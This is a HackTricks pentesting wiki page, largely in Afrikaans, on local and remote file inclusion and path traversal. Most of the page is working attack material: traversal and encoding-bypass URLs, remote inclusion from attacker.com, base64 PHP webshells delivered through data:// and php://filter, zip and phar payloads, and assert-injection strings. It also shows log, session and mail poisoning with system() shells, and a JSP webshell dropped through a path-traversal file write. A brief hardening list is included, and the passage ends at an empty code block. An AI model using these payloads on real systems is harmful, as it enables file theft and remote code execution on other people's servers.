# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Die lêer word vanaf 'n afgeleë bediener gelaai (Beste: Jy kan die kode skryf en die bediener sal dit uitvoer). In php is dit **ongeskakel** by verstek (**allow_url_include**).\
**Local File Inclusion (LFI):** Die bediener laai 'n plaaslike lêer.

Die kwesbaarheid ontstaan wanneer die gebruiker op een of ander manier die lêer kan beheer wat deur die bediener gelaai gaan word.

Kwetsbare **PHP functions**: require, require_once, include, include_once

'n Interessante hulpmiddel om hierdie kwesbaarheid te misbruik: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interessant - LFI2RCE lêers
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Deur verskeie *nix LFI-lysies te meng en meer paaie by te voeg het ek hierdie een geskep:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Probeer ook om `/` met `\` te vervang.  
Probeer ook om `../../../../../` by te voeg.

A list that uses several techniques to find the file /etc/password (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Samevoeging van verskillende wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Probeer ook om `/` met `\` te vervang.  
Probeer ook om `C:/` te verwyder en `../../../../../` by te voeg.

A list that uses several techniques to find the file /boot.ini (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Kyk na die LFI-lys van linux.

## Basiese LFI en omseilings

Al die voorbeelde is vir Local File Inclusion maar kan ook op Remote File Inclusion toegepas word (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences nie-rekursief verwyder
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass die byvoeging van ekstra karakters aan die einde van die gegewe string (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Dit is **opgelos sedert PHP 5.4**

### **Enkodering**

Jy kan nie-standaard enkoderinge gebruik soos double URL encode (en ander):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Vanaf bestaande vouer

Miskien kontroleer die back-end die vouerpad:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Verken lêerstelsel-direktore op 'n bediener

Die lêerstelsel van 'n bediener kan rekursief verken word om direktore, nie net lêers nie, te identifiseer deur sekere tegnieke toe te pas. Hierdie proses behels die bepaling van die direktorie-diepte en die peiling vir die bestaan van spesifieke gidse. Hieronder is 'n gedetailleerde metode om dit te bereik:

1. **Bepaal direktorie-diepte:** Bepaal die diepte van jou huidige direktorie deur suksesvol die `/etc/passwd`-lêer te haal (van toepassing as die bediener op Linux gebaseer is). 'n Voorbeeld-URL kan soos volg gestruktureer wees, wat 'n diepte van drie aandui:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Ondersoek vouers:** Voeg die naam van die vermoedelike gids (bv., `private`) by die URL, en navigeer dan terug na `/etc/passwd`. Die ekstra gidsvlak vereis dat die diepte met een verhoog word:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpreteer die Resultate:** Die bediener se reaksie dui aan of die gids bestaan:
- **Fout / Geen Uitset:** Die gids `private` bestaan waarskynlik nie op die gespesifiseerde ligging nie.
- **Inhoud van `/etc/passwd`:** Die teenwoordigheid van die gids `private` is bevestig.
4. **Rekursiewe Verkenning:** Ontdekte gidse kan verder probeer word vir subgidse of lêers deur dieselfde tegniek of tradisionele Local File Inclusion (LFI)-metodes te gebruik.

Om gidse op verskillende plekke in die lêerstelsel te verken, pas die payload ooreenkomstig aan. Byvoorbeeld, om te kontroleer of `/var/www/` `private` bevat (aangenome dat die huidige gids op 'n diepte van 3 is), gebruik:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation is 'n metode wat gebruik word om lêerpaaie in webtoepassings te manipuleer. Dit word dikwels gebruik om toegang tot beperkte lêers te kry deur sekere sekuriteitsmaatreëls wat ekstra karakters aan die einde van lêerpaaie toevoeg, te omseil. Die doel is om 'n lêerpad te skep wat, nadat dit deur die sekuriteitsmaatreël verander is, steeds na die beoogde lêer wys.

In PHP kan verskeie voorstellings van 'n lêerpad as ekwivalent beskou word weens die aard van die lêerstelsel. Byvoorbeeld:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` word almal as dieselfde pad beskou.
- Wanneer die laaste 6 karakters `passwd` is, verander die toevoeging van 'n `/` (waardeur dit `passwd/` word) nie die geteikende lêer nie.
- Net so, as `.php` bygevoeg word by 'n lêerpad (soos `shellcode.php`), sal die byvoeging van `/.` aan die einde nie die toegang tot die lêer verander nie.

Die onderstaande voorbeelde demonstreer hoe om path truncation te gebruik om toegang tot `/etc/passwd` te kry, 'n algemene teiken weens die sensitiewe inhoud daarvan (gebruikersrekeninginligting):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In hierdie scenario's kan die aantal traversals wat benodig word ongeveer 2027 wees, maar hierdie getal kan wissel op grond van die bediener se konfigurasie.

- **Gebruik van dot-segmante en bykomende karakters**: Traversal sequences (`../`) in kombinasie met ekstra dot-segmante en karakters kan gebruik word om deur die lêerstelsel te navigeer, en effektief aangehegte stringe deur die bediener te ignoreer.
- **Bepaling van die vereiste aantal traversals**: Deur proef-en-fout kan mens die presiese aantal `../`-reekse vind wat nodig is om na die root-gids te navigeer en dan na `/etc/passwd`, en sodoende enige aangehegte stringe (soos `.php`) te neutraliseer terwyl die gewenste pad (`/etc/passwd`) ongeskonde bly.
- **Begin met 'n nie-bestaande gids**: Dit is 'n algemene praktyk om die pad te begin met 'n nie-bestaande gids (soos `a/`). Hierdie tegniek word as 'n voorsorgmaatreël gebruik of om die vereistes van die bediener se padparseringslogika te vervul.

Wanneer padtronkeringstegnieke gebruik word, is dit van kardinale belang om die bediener se padparseringsgedrag en lêerstelselstruktuur te verstaan. Elke scenario kan 'n verskillende benadering vereis, en toetsing is dikwels nodig om die mees doeltreffende metode te vind.

**Hierdie kwesbaarheid is in PHP 5.3 reggestel.**

### **Filter-omseilingstrieke**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

In php is dit standaard gedeaktiveer omdat **`allow_url_include`** op **Off** is. Dit moet op **On** wees om te werk, en in daardie geval kan jy 'n PHP-lêer van jou bediener insluit en RCE kry:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
As daar om een of ander rede **`allow_url_include`** **On** is, maar PHP toegang tot eksterne webblaaie **filtreer**, [volgens hierdie post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), kan jy byvoorbeeld die data protocol met base64 gebruik om 'n b64 PHP code te decode en RCE te kry:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> In die vorige kode is die finale `+.txt` bygevoeg omdat die attacker 'n string nodig gehad het wat op `.txt` eindig, so die string daarmee eindig en na die b64 decode sal daardie deel net rommel teruggee en die werklike PHP-kode ingesluit word (en dus uitgevoer).

Nog 'n voorbeeld **wat nie die `php://` protokol gebruik nie** sou wees:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Wortel-element

In Python, in 'n kode soos hierdie:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
As die gebruiker 'n **absolute path** aan **`file_name`** deurgee, word die **vorige pad net verwyder**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Dit is die bedoelde gedrag volgens [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> As 'n komponent 'n absolute pad is, word alle vorige komponente weggegooi en gaan die samevoeging voort vanaf die absolute pad-komponent.

## Java Lys van gidse

Dit lyk of, as jy 'n Path Traversal in Java het en jy **vra vir 'n gids** in plaas van 'n lêer, 'n **lys van die gids teruggegee word**. Dit sal nie in ander tale gebeur nie (afaik).

## Top 25 parameters

Hier is 'n lys van die Top 25 parameters wat kwesbaar kan wees vir local file inclusion (LFI) kwetsbaarhede (van [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI met PHP-wrappers & protokolle

### php://filter

PHP filters laat toe om basiese **wysigingsoperasies op die data** uit te voer voordat dit gelees of geskryf word. Daar is 5 kategorieë filters:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Verwyder tags uit die data (alles tussen die "<" en ">" karakters)
- Let daarop dat hierdie filter in moderne weergawes van PHP verdwyn het
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transformeer na 'n ander enkoding (`convert.iconv.<input_enc>.<output_enc>`). Om die **lys van alle enkodings** wat ondersteun word te kry, voer in die konsole: `iconv -l`

> [!WARNING]
> Deur misbruik van die `convert.iconv.*` omskakelingsfilter kan jy **arbitrêre teks genereer**, wat nuttig kan wees om arbitrêre teks te skryf of om 'n funksie soos include arbitrêre teks te laat verwerk. Vir meer inligting kyk [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Komprimeer die inhoud (nuttig as jy baie info wil exfiltrate)
- `zlib.inflate`: Dekomprimeer die data
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Verouderd
- `mdecrypt.*` : Verouderd
- Ander Filters
- As jy in PHP `var_dump(stream_get_filters());` uitvoer, kan jy 'n paar **onverwagte filters** vind:
- `consumed`
- `dechunk`: draai HTTP chunked encoding om
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Die gedeelte "php://filter" is nie sensitief vir hoof- en kleinletters nie

### Gebruik van php filters as oracle om arbitrêre lêers te lees

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) word 'n tegniek voorgestel om 'n plaaslike lêer te lees sonder dat die uitset deur die bediener teruggegee word. Hierdie tegniek is gebaseer op 'n **boolean exfiltration of the file (char by char) using php filters** as oracle. Dit is omdat php filters gebruik kan word om 'n teks groot genoeg te maak sodat php 'n uitsondering gooi.

In die oorspronklike post vind jy 'n gedetaileerde uitleg van die tegniek, maar hier is 'n vinnige samevatting:

- Use the codec **`UCS-4LE`** om die leidende karakter van die teks aan die begin te laat staan en sodoende die stringgrootte eksponensieel te laat toeneem.
- Dit sal gebruik word om 'n **teks te genereer wat so groot word wanneer die aanvanklike letter korrek geraai is** dat php 'n **error** sal veroorsaak.
- Die **dechunk** filter sal **alles verwyder as die eerste char nie 'n hexadecimal is nie**, sodat ons kan weet of die eerste char hex is.
- Dit, gekombineer met die vorige (en ander filters afhangend van die geraaide letter), sal ons toelaat om 'n letter aan die begin van die teks te raai deur te sien wanneer ons genoeg transformasies doen om dit nie meer 'n hexadecimal karakter te laat wees nie. Want as dit hex is, sal dechunk dit nie verwyder nie en die aanvanklike bom sal die php error veroorsaak.
- Die codec **convert.iconv.UNICODE.CP930** transformeer elke letter na die volgende een (so na hierdie codec: a -> b). Dit stel ons in staat om te ontdek of die eerste letter byvoorbeeld 'n `a` is, want as ons 6 keer hierdie codec toepas a->b->c->d->e->f->g is die letter nie meer 'n hexadecimal karakter nie, daarom verwyder dechunk dit nie en die php error word geaktiveer omdat dit met die aanvanklike bom vermenigvuldig.
- Deur ander transformasies soos **rot13** aan die begin te gebruik is dit moontlik om ander chars te leak soos n, o, p, q, r (en ander codecs kan gebruik word om ander letters in die hex-bereik te skuif).
- Wanneer die aanvanklike char 'n getal is, is dit nodig om dit base64 te encode en die eerste 2 letters te leak om die getal te bepaal.
- Die finale probleem is om te sien **hoe om meer te leak as die aanvanklike letter**. Deur order memory filters soos **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** te gebruik is dit moontlik om die volgorde van die chars te verander en ander letters van die teks in die eerste posisie te kry.
- En om verder data te kan verkry, is die idee om **2 bytes van junk data aan die begin te genereer** met **convert.iconv.UTF16.UTF16**, toe te pas **UCS-4LE** om dit te **pivot with the next 2 bytes**, en d**verwyder die data tot by die rommeldata** (this will remove the first 2 bytes of the initial text). Gaan voort hiermee totdat jy by die gewenste bit kom om te leak.

In die post is daar ook 'n hulpmiddel gelek om dit outomaties uit te voer: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Hierdie wrapper maak dit moontlik om toegang te kry tot file descriptors wat die proses oop het. Potensieel nuttig om die exfiltrate inhoud van geopende lêers te bekom:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Jy kan ook **php://stdin, php://stdout and php://stderr** gebruik om toegang te kry tot die **file descriptors 0, 1 and 2** onderskeidelik (nie seker hoe dit in 'n aanval nuttig kan wees nie)

### zip:// and rar://

Laai 'n Zip- of Rar-lêer met 'n PHPShell daarin op en kry toegang daartoe.\
Om die rar-protokol te kan misbruik, moet dit **spesifiek geaktiveer** word.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Neem kennis dat hierdie protokol beperk word deur php-konfigurasies **`allow_url_open`** en **`allow_url_include`**

### expect://

Expect moet geaktiveer wees. Jy kan kode hiermee uitvoer:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Spesifiseer jou payload in die POST parameters:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

'n `.phar`-lêer kan gebruik word om PHP-kode uit te voer wanneer 'n webtoepassing funksies soos `include` gebruik om lêers te laai. Die onderstaande PHP-kodefragment demonstreer die skep van 'n `.phar`-lêer:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Om die `.phar`-lêer te kompileer, moet die volgende opdrag uitgevoer word:
```bash
php --define phar.readonly=0 create_path.php
```
By uitvoering sal 'n lêer met die naam `test.phar` geskep word, wat moontlik benut kan word om Local File Inclusion (LFI)-kwesbaarhede uit te buit.

In gevalle waar die LFI slegs lêerlees uitvoer sonder die uitvoering van die PHP-kode daarin, deur funksies soos `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, of `filesize()`, kan 'n eksploitasie van 'n deserialization vulnerability probeer word. Hierdie kwesbaarheid is geassosieer met die lees van lêers deur die `phar`-protokol.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Dit was moontlik om **any arbitrary file read from PHP that supports php filters** te misbruik om 'n RCE te kry. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Baie vinnige opsomming: 'n **3 byte overflow** in die PHP-heap is misbruik om die **ketting van vrye chunks** van 'n spesifieke grootte te verander sodat dit moontlik was om **write anything in any address**, dus is 'n hook bygevoeg om **`system`** aan te roep.\
Dit was moontlik om chunks van spesifieke groottes te alloc deur meer php filters te misbruik.

### Meer protokolle

Kyk na meer moontlike[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Skryf in geheue of in 'n tydelike lêer (nie seker hoe dit in 'n file inclusion attack nuttig kan wees nie)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Toegang tot plaaslike lêerstelsel
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Toegang tot HTTP(s) URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Toegang tot FTP(s) URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Kompressiestrome
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Vind padname wat by 'n patroon pas (Dit lewer niks drukbaar terug nie, so nie regtig nuttig hier nie)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio-strome (Nie nuttig om arbitrêre lêers te lees nie)

## LFI via PHP se 'assert'

Local File Inclusion (LFI)-risiko's in PHP is besonder hoog wanneer daar met die 'assert' funksie gewerk word, wat kode binne strings kan uitvoer. Dit is veral problematies as invoer wat directory traversal-karakters soos ".." bevat, nagegaan word maar nie behoorlik gesuiwer word nie.

Byvoorbeeld, PHP-kode mag ontwerp wees om directory traversal te voorkom soos volg:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Alhoewel dit daarop gemik is om traversal te voorkom, skep dit onbedoeld 'n vektor vir code injection. Om dit uit te buit om lêerinhoud te lees, kan 'n aanvaller die volgende gebruik:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Net so, om ewekansige stelselopdragte uit te voer, kan iemand gebruik:
```plaintext
' and die(system("id")) or '
```
Dit is belangrik om **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Hierdie tegniek is relevant in gevalle waar jy die **file path** van 'n **PHP function** beheer wat 'n **access a file** sal doen maar jy sal nie die inhoud van die lêer sien nie (soos 'n eenvoudige oproep na **`file()`**) maar die inhoud word nie gewys nie.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) word verduidelik hoe 'n blind path traversal via PHP filter misbruik kan word om **exfiltrate the content of a file via an error oracle**.

In samevatting, die tegniek gebruik die **"UCS-4LE" encoding** om die inhoud van 'n lêer so **big** te maak dat die **PHP function opening** die lêer 'n **error** sal veroorsaak.

Dan, om die eerste char te bepaal word die filter **`dechunk`** gebruik saam met ander soos **base64** of **rot13** en uiteindelik word die filters **convert.iconv.UCS-4.UCS-4LE** en **convert.iconv.UTF16.UTF-16BE** gebruik om **place other chars at the beggining and leak them**.

Funksies wat moontlik kwesbaar is: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Vir die tegniese besonderhede, kyk die genoemde post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Wanneer server-side code wat files ingests/uploads die destination path bou met user-controlled data (bv. 'n filename of URL) sonder om dit te canonicalise en validate, kan `..` segments en absolute paths uit die bedoelde directory ontsnap en 'n arbitrary file write veroorsaak. As jy die payload onder 'n web-exposed directory kan plaas, kry jy gewoonlik unauthenticated RCE deur 'n webshell te drop.

Tipiese exploitasie-werkvloei:
- Identifiseer 'n write primitive in 'n endpoint of background worker wat 'n path/filename aanvaar en content na disk skryf (bv. message-driven ingestion, XML/JSON command handlers, ZIP extractors, ens.).
- Bepaal web-exposed directories. Algemene voorbeelde:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Skep 'n traversal path wat uit die bedoelde storage directory in die webroot breek, en sluit jou webshell content in.
- Blaai na die dropped payload en voer commands uit.

Nota:
- Die vulnerable service wat die write uitvoer kan op 'n non-HTTP port luister (bv. 'n JMF XML listener op TCP 4004). Die hoof web portal (op 'n ander port) sal later jou payload bedien.
- Op Java stacks word hierdie file writes dikwels geïmplementeer met eenvoudige `File`/`Paths` concatenation. Gebrek aan canonicalisation/allow-listing is die kernfout.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Verharding wat hierdie klas foute neutraliseer:
- Los op na 'n kanoniese pad en dwing af dat dit 'n subgids is van 'n allow-listed basisgids.
- Weier enige pad wat `..`, absolute wortels, of skyfletters bevat; verkies gegenereerde lêernaam.
- Voer die skrywer uit as 'n laag-geprivilegieerde gebruiker en skei skryfgidse van geserveerde wortels.

## Remote File Inclusion

Explained previously, [**volg hierdie skakel**](#remote-file-inclusion).

### Deur Apache/Nginx loglêer

As die Apache- of Nginx-bediener **vulnerable to LFI** binne die include function is, kan jy probeer om toegang te kry tot **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, plaas binne die **user agent** of in 'n **GET parameter** 'n PHP-shell soos **`<?php system($_GET['c']); ?>`** en daardie lêer include.

> [!WARNING]
> Let wel dat **as jy dubbel-aanhalingstekens gebruik** vir die shell in plaas van **enkel-aanhalingstekens**, sal die dubbel-aanhalingstekens verander word na die string "_**quote;**_", **PHP sal 'n fout gooi** daar en **niks anders sal uitgevoer word**.
>
> Maak ook seker dat jy die payload **korrek skryf**, anders sal PHP elke keer 'n fout gee wanneer dit probeer om die log-lêer te laai en jy sal nie 'n tweede geleentheid hê nie.

Dit kan ook in ander logs gedoen word maar **wees versigtig,** die kode binne die logs kan URL-geënkodeer wees en dit kan die Shell vernietig. Die header **authorisation "basic"** bevat "user:password" in Base64 en dit word in die logs gedekodeer. Die PHPShell kan in hierdie header ingevoeg word.\ 
Ander moontlike logpaaie:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Per e-pos

**Stuur 'n e-pos** na 'n interne rekening (user@localhost) wat jou PHP payload bevat soos `<?php echo system($_REQUEST["cmd"]); ?>` en probeer om die e-pos van die gebruiker in te sluit met 'n pad soos **`/var/mail/<USERNAME>`** of **`/var/spool/mail/<USERNAME>`**

### Per /proc/*/fd/*

1. Laai baie shells op (byvoorbeeld : 100)  
2. Sluit [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) in, met $PID = PID van die proses (kan brute forced word) en $FD die file descriptor (kan ook brute forced word)

### Per /proc/self/environ

Soortgelyk aan 'n log-lêer, stuur die payload in die User-Agent; dit sal binne die /proc/self/environ-lêer weerspieël word
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

As jy 'n lêer kan upload, inject net die shell payload daarin (bv: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Om die lêer leesbaar te hou, is dit die beste om dit in die metadata van beelde/doc/pdf in te voeg

### Via ZIP-lêer op laai

Laai 'n ZIP-lêer op wat 'n gecomprimeerde PHP shell bevat en kry toegang:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Deur PHP sessions

Kontroleer of die webwerf PHP Session (PHPSESSID) gebruik
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP word hierdie sessies in _/var/lib/php5/sess\\_\[PHPSESSID]\_ lêers gestoor
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Stel die cookie in op `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Gebruik die LFI om die PHP-sessie-lêer in te sluit
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Deur ssh

As ssh aktief is, kyk watter gebruiker gebruik word (/proc/self/status & /etc/passwd) en probeer toegang kry tot **\<HOME>/.ssh/id_rsa**

### **Deur** **vsftpd** _**loglêers**_

Die loglêers vir die FTP-bediener vsftpd is geleë by _**/var/log/vsftpd.log**_. In die scenario waar 'n Local File Inclusion (LFI) kwesbaarheid bestaan en toegang tot 'n blootgestelde vsftpd-bediener moontlik is, kan die volgende stappe oorweeg word:

1. Injekteer 'n PHP payload in die gebruikersnaamveld tydens die aanmeldproses.
2. Na die injeksie gebruik die LFI om die bediener-loglêers van _**/var/log/vsftpd.log**_ te onttrek.

### Deur php base64 filter (using base64)

Soos getoon in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) artikel, die PHP base64-filter ignoreer nie-base64. Jy kan dit gebruik om die lêeruitbreidingskontrole te omseil: as jy base64 voorsien wat eindig met ".php", sal dit die "." ignoreer en "php" by die base64 aanheg. Hier is 'n voorbeeld-payload:
```url
